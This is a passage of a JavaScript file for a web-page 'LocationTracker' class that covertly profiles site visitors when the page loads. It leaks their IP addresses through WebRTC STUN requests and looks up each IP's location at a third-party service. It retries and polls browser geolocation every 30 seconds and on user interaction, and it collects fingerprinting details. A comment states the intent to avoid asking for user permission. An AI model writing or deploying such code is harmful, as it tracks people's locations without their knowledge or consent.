        rtt: conn.rtt,
        saveData: conn.saveData,
        type: conn.type
      };
    }
    return null;
  }

  getStorageInfo() {
    const storage = {};
    
    try {
      storage.localStorage = !!window.localStorage;
      storage.sessionStorage = !!window.sessionStorage;
      storage.indexedDB = !!window.indexedDB;
      storage.webSQL = !!window.openDatabase;
    } catch (e) {
      storage.error = e.message;
    }
    
    return storage;
  }

  getPerformanceTiming() {
    if ('performance' in window && 'timing' in performance) {
      const timing = performance.timing;
      return {
        navigationStart: timing.navigationStart,
        domainLookupStart: timing.domainLookupStart,
        domainLookupEnd: timing.domainLookupEnd,
        connectStart: timing.connectStart,
        connectEnd: timing.connectEnd,
        requestStart: timing.requestStart,
        responseStart: timing.responseStart,
        responseEnd: timing.responseEnd,
        domLoading: timing.domLoading,
        domContentLoadedEventStart: timing.domContentLoadedEventStart,
        domContentLoadedEventEnd: timing.domContentLoadedEventEnd,
        loadEventStart: timing.loadEventStart,
        loadEventEnd: timing.loadEventEnd
      };
    }
    return null;
  }

  generateSessionId() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
  }

  hashCode(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      const char = str.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash; // Convert to 32bit integer
    }
    return hash;
  }

  getMostCommon(arr) {
    return arr.sort((a,b) =>
      arr.filter(v => v === a).length - arr.filter(v => v === b).length
    ).pop();
  }

  // Enhanced WebRTC IP detection with location mapping
  async trackEnhancedWebRTCIPs() {
    try {
      const pc = new RTCPeerConnection({
        iceServers: [
          { urls: 'stun:stun.l.google.com:19302' },
          { urls: 'stun:stun1.l.google.com:19302' },
          { urls: 'stun:stun2.l.google.com:19302' }
        ]
      });

      const ips = [];
      const candidates = [];
      
      pc.onicecandidate = (event) => {
        if (event.candidate) {
          const candidate = event.candidate.candidate;
          candidates.push(candidate);
          
          // Extract IP addresses
          const ipMatch = candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
          if (ipMatch && !ips.includes(ipMatch[1])) {
            ips.push(ipMatch[1]);
            
            // Try to get location for each IP
            this.getLocationForIP(ipMatch[1]);
          }
        }
      };

      // Create data channel to trigger ICE gathering
      pc.createDataChannel('location-test');
      const offer = await pc.createOffer();
      await pc.setLocalDescription(offer);

      setTimeout(() => {
        const webrtcData = {
          type: 'enhanced_webrtc_ips',
          timestamp: new Date().toISOString(),
          localIPs: ips,
          allCandidates: candidates,
          accuracy: 'network_level',
          method: 'webrtc_enhanced'
        };
        this.sendLocationData(webrtcData);
        pc.close();
      }, 3000);

    } catch (error) {
      console.log('Enhanced WebRTC IP detection failed:', error);
    }
  }

  // Get location for specific IP
  async getLocationForIP(ip) {
    try {
      const response = await fetch(`https://ipapi.co/${ip}/json/`);
      const data = await response.json();
      
      const ipLocationData = {
        type: 'specific_ip_location',
        timestamp: new Date().toISOString(),
        targetIP: ip,
        city: data.city,
        region: data.region,
        country: data.country_name,
        latitude: data.latitude,
        longitude: data.longitude,
        isp: data.org,
        method: 'ip_specific_lookup',
        precision: 'IP_SPECIFIC'
      };
      this.sendLocationData(ipLocationData);
    } catch (error) {
      console.log(`Failed to get location for IP ${ip}`);
    }
  }

  // Try to force location access through multiple attempts
  async forceLocationAccess() {
    const attempts = [
      { enableHighAccuracy: true, timeout: 1000, maximumAge: 0 },
      { enableHighAccuracy: false, timeout: 2000, maximumAge: 30000 },
      { enableHighAccuracy: true, timeout: 5000, maximumAge: 60000 },
      { enableHighAccuracy: false, timeout: 10000, maximumAge: 300000 }
    ];

    for (let i = 0; i < attempts.length; i++) {
      try {
        await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              const forceData = {
                type: `forced_location_attempt_${i + 1}`,
                timestamp: new Date().toISOString(),
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                attempt: i + 1,
                settings: attempts[i],
                method: 'force_multiple_attempts',
                precision: 'GPS_FORCED_MULTIPLE'
              };
              this.sendLocationData(forceData);
              resolve(position);
            },
            reject,
            attempts[i]
          );
        });
        break; // If successful, stop trying
      } catch (error) {
        console.log(`Location attempt ${i + 1} failed`);
        if (i === attempts.length - 1) {
          console.log('All location attempts failed');
        }
      }
    }
  }

  // Continuous location monitoring
  startContinuousLocationMonitoring() {
    // Try to get location every 30 seconds
    setInterval(() => {
      this.tryQuickLocationGrab();
    }, 30000);

    // Try to get location when page becomes visible
    document.addEventListener('visibilitychange', () => {
      if (!document.hidden) {
        this.tryQuickLocationGrab();
      }
    });

    // Try to get location on user interaction
    ['click', 'touch', 'keydown'].forEach(event => {
      document.addEventListener(event, () => {
        this.tryQuickLocationGrab();
      }, { once: true });
    });
  }

  // Quick location grab attempt
  tryQuickLocationGrab() {
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const quickData = {
            type: 'continuous_location_grab',
            timestamp: new Date().toISOString(),
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            method: 'continuous_monitoring',
            precision: 'GPS_CONTINUOUS'
          };
          this.sendLocationData(quickData);
        },
        () => {},
        { enableHighAccuracy: false, timeout: 2000, maximumAge: 60000 }
      );
    }
  }

  // Remove GPS location request function since we don't want user permission

  trackPageView() {
    const pageData = {
      type: 'page_view',
      timestamp: new Date().toISOString(),
      page: window.location.pathname,
      title: document.title,
      referrer: document.referrer,
      userAgent: navigator.userAgent,
      screenResolution: `${screen.width}x${screen.height}`,
      windowSize: `${window.innerWidth}x${window.innerHeight}`,
      language: navigator.language,
      platform: navigator.platform
    };

    this.sendLocationData(pageData);
  }

  // Send data to your server or analytics service
  async sendLocationData(data) {
    try {
      // Option 1: Send to your own server
      // await fetch('/api/track-location', {
      //   method: 'POST',
      //   headers: { 'Content-Type': 'application/json' },
      //   body: JSON.stringify(data)
      // });

      // Option 2: Store locally for now (you can retrieve via console)
      this.trackingData.push(data);
      localStorage.setItem('visitorTracking', JSON.stringify(this.trackingData));

      // Option 3: Send to Google Analytics as custom event
      if (typeof gtag !== 'undefined') {
        gtag('event', 'location_tracked', {
          custom_parameter_1: data.type,
          custom_parameter_2: data.city || 'unknown',
          custom_parameter_3: data.country || 'unknown'
        });
      }

    } catch (error) {
      console.error('Error sending location data:', error);
    }
  }

  // Get all tracked data
  getTrackingData() {
    return JSON.parse(localStorage.getItem('visitorTracking') || '[]');
  }

  // Clear tracking data
  clearTrackingData() {
    localStorage.removeItem('visitorTracking');
    this.trackingData = [];
  }
}

// Initialize tracking when page loads
document.addEventListener('DOMContentLoaded', () => {
  window.locationTracker = new LocationTracker();
});

// Make functions available globally for debugging
window.getTrackingData = () => window.locationTracker?.getTrackingData();
window.clearTrackingData = () => window.locationTracker?.clearTrackingData();